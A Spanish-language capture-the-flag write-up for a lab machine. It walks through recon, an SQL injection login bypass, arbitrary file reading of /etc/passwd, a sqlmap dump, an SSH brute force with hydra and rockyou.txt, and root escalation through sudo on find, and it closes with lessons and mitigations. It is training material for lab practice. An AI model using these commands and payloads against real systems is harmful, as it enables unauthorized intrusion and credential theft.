## Información General

|Campo|Detalle|
|---|---|
|**Nombre de la máquina**|Bocata de Calamares|
|**Plataforma**|TheHackersLabs|
|**Dificultad**|No especificada|
|**Sistema Operativo**|Linux (Ubuntu)|
|**IP**|192.168.241.150|
|**Servicios expuestos**|SSH (22), HTTP (80)|

---

## Resumen del Ataque

La máquina aloja "AFN" (All Fake News), un sitio web con un login vulnerable a inyección SQL que permite un bypass de autenticación clásico. Desde el panel de administración se llega a un diario personal del desarrollador y, a partir de ahí, a una to-do-list donde el propio admin revela pensando que así la ocultaba el nombre en Base64 de una página de lectura de archivos internos del servidor. Esa página permite leer cualquier fichero legible por el proceso web, incluido `/etc/passwd`, que expone los usuarios del sistema y, en un comentario HTML dejado por el propio desarrollador, una pista explícita de que el servicio SSH es vulnerable a fuerza bruta con `hydra`. Un `sqlmap` sobre el formulario de login vuelca además una tabla de usuarios de la aplicación (sin relación directa con el acceso SSH). El bruteforce contra `superadministrator` con `rockyou.txt` da las credenciales SSH, y una vez dentro, un permiso `sudo` sin restricciones sobre `find` permite escalar a root de forma trivial vía GTFOBins.

---

## Técnicas Usadas

- Reconocimiento de puertos y servicios con Nmap
- Revisión de código fuente HTML para identificar rutas y funcionalidades
- Fuzzing de directorios y ficheros web (dirsearch)
- Bypass de autenticación por inyección SQL (`' OR '1'='1`)
- Escalada de información por "seguridad por oscuridad" (nombre de página oculto codificado en Base64)
- Lectura de archivos arbitrarios del servidor vía funcionalidad expuesta (tipo LFI)
- Extracción automatizada de base de datos con `sqlmap --forms`
- Ataque de fuerza bruta contra SSH con `hydra` y diccionario `rockyou.txt`
- Escalada de privilegios abusando de permiso `sudo` sin contraseña sobre `find` (GTFOBins)

---

## Desarrollo

### 1. Escaneo de puertos completo

```
sudo nmap -p- -sS --min-rate 5000 -n -vvv -Pn -oN ports 192.168.241.150
```

![[IMG-20260809171454180.png]]

### 2. Escaneo de versiones

```
nmap -p 22,80 -sC -sV -oN allports 192.168.241.150
```

![[IMG-20260809171454267.png]]

### 3. Enumeración web — revisión del código fuente

![[IMG-20260809171454391.png]]

Se accede a `http://192.168.241.150/` y se revisa el HTML. Además del contenido de relleno tipo "Lorem Ipsum", destaca un enlace a `sqli.php` en una de las noticias, sugiriendo (como pista narrativa del propio reto) una posible inyección SQL en algún punto del sitio. No se profundiza en `sqli.php` directamente ya que el fuzzing de directorios (paso siguiente) revela un vector más concreto: un formulario de login real.

### 4. Fuzzing de directorios

```
dirsearch -u http://192.168.241.150/ --exclude-status 403,404,500 -e php,txt,html
```

![[IMG-20260809171454449.png]]

### 5. Bypass de autenticación por SQLi en el login

```
http://192.168.241.150/login.php
```

![[IMG-20260809171454509.png]]

Credenciales usadas: `admin` / `' OR '1'='1`

El bypass funciona y se obtiene acceso a `admin.php`.

### 6. Panel de administración — diario del desarrollador

```
http://192.168.241.150/admin.php
```

![[IMG-20260809171454565.png]]

El diario menciona la creación de una `to-do-list`:

```
Día 2: Esto es demasiado chapucero para un programador de mi nivel,
voy a crear una to-do-list para ir cubriendo todos mis súper objetivos.
```

### 7. To-do-list — filtración del nombre de una página oculta

```
http://192.168.241.150/todo-list.php
```

![[IMG-20260809171454613.png]]

Una de las tareas revela, sin darse cuenta el propio desarrollador, el nombre codificado en Base64 de una página que permite leer archivos internos del servidor:

```
He creado una nueva página para poder leer los ficheros internos del
servidor, cada día soy un mejor programador. Además he codificado su
nombre en base64, así nadie podrá dar con ella (lee_archivos).
```

### 8. Decodificación del nombre de la página

```
echo 'lee_archivos' | base64
```

![[IMG-20260809171454661.png]]

### 9. Acceso a la página de lectura de archivos

```
http://192.168.241.150/bGVlX2FyY2hpdm9zCg==.php
```

![[IMG-20260809171454711.png]]

Se trata de un formulario que permite introducir una ruta de archivo. Al probar `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
...
tyuiop:x:1000:1000:tyuiop:/home/tyuiop:/bin/bash
mysql:x:110:110:MySQL Server,,,:/nonexistent:/bin/false
superadministrator:x:1001:1001:,,,:/home/superadministrator:/bin/bash
```

Y, dejados por el propio desarrollador, dos comentarios HTML clave:

![[IMG-20260809171454765.png]]

```html
<!-- Tengo que limitar los archivos que se pueden ver, al menos hasta que los usuarios tengan unas contraseñas más robustas -->
<!-- Si alguien leyera el archivo donde se encuentran los usuarios y usara la herramienta hydra para atacar nuestro servicio ssh... Bueno, mañana me encargare de ello -->
```

Esto confirma tanto los nombres de usuario del sistema como la vía de ataque sugerida: fuerza bruta SSH con `hydra`.

### 10. Volcado de la base de datos de la aplicación

```
sqlmap -u 'http://192.168.241.150/login.php' --batch --dump --forms
```

![[IMG-20260809171454813.png]]


Estos usuarios pertenecen a la aplicación web, no al sistema operativo, y ninguno coincide con `superadministrator` (usuario del sistema visto en `/etc/passwd`). Vía descartada para el acceso SSH.

### 11. Fuerza bruta contra SSH

Siguiendo la pista dejada en el comentario HTML:

```
hydra -l superadministrator -P /usr/share/wordlists/rockyou.txt ssh://192.168.241.150 -t 4
```

![[IMG-20260809171454864.png]]

Credenciales encontradas: `superadministrator:princesa`

### 12. Acceso SSH y captura de la flag de usuario

```
ssh superadministrator@192.168.241.150
```

```
superadministrator@thehackerslabs-bocatacalamares:~$ cat flag.txt
```

![[IMG-20260809171454926.png]]

Al decodificar en Base64, el contenido no es la flag en sí sino una pista para el siguiente paso:

```
echo 'c3VkbyAtbAo=' | base64 -d
```

![[IMG-20260809171454974.png]]

También se encuentra una nota adicional:

```
superadministrator@thehackerslabs-bocatacalamares:~$ cat recordatorio.txt
```

![[IMG-20260809171455037.png]]

```
Me han dicho que existe una pagina llamada gtfobins muy util para ctfs, la dejo aquí apuntada para recordarlo mas adelante.
```

### 13. Enumeración de privilegios sudo

```
superadministrator@thehackerslabs-bocatacalamares:~$ sudo -l
```

![[IMG-20260809171455082.png]]

### 14. Escalada de privilegios vía GTFOBins

```
superadministrator@thehackerslabs-bocatacalamares:~$ sudo find . -exec /bin/sh \; -quit
```

```
# whoami
```

![[IMG-20260809171455131.png]]

### 15. Captura de la flag de root

```
# cd /root
# cat root.txt
```

![[IMG-20260809171455186.png]]

---

## Lecciones Aprendidas

- Codificar un nombre en Base64 no es control de acceso ni "ocultación" real: sigue siendo texto plano trivialmente reversible, y además el propio desarrollador lo documentó él mismo en un lugar accesible (`todo-list.php`).
- Los comentarios HTML dejados "para uno mismo" durante el desarrollo (recordatorios, notas de TODO, pistas de ataque) terminan en producción y son visibles para cualquiera que revise el código fuente o las respuestas del servidor.
- Una funcionalidad de "leer archivo por ruta" sin restricción de directorio es equivalente a una vulnerabilidad de Local File Inclusion / Arbitrary File Read, con el mismo impacto que cualquier LFI clásico.
- Reutilizar contraseñas débiles y predecibles (presentes en diccionarios como `rockyou.txt`) en cuentas del sistema operativo hace que la fuerza bruta sea trivial una vez se conoce el nombre de usuario.
- Otorgar `sudo` sin restricciones sobre binarios como `find`, que tienen funciones de ejecución de comandos integradas (`-exec`), equivale en la práctica a dar `sudo ALL` sin restricciones.

---

## Medidas de Mitigación

- Usar consultas parametrizadas / prepared statements en el login para eliminar por completo la inyección SQL, en vez de sanitización ad-hoc.
- No depender de "seguridad por oscuridad" (nombres de rutas ofuscados) como único control de acceso a funcionalidades sensibles del servidor.
- Eliminar comentarios de desarrollo, notas y recordatorios del código antes de pasar a producción; revisar el HTML/JS servido al cliente como parte del proceso de despliegue.
- Cualquier funcionalidad que lea archivos por ruta debe validar contra una whitelist de rutas/directorios permitidos y nunca aceptar rutas absolutas arbitrarias del usuario.
- Forzar políticas de contraseñas robustas para todas las cuentas del sistema, especialmente las expuestas por SSH, y considerar `fail2ban` o límites de intentos para mitigar fuerza bruta.
- Aplicar el principio de mínimo privilegio en las reglas de `sudoers`: nunca otorgar `NOPASSWD` sobre binarios listados en GTFOBins sin restringir argumentos.



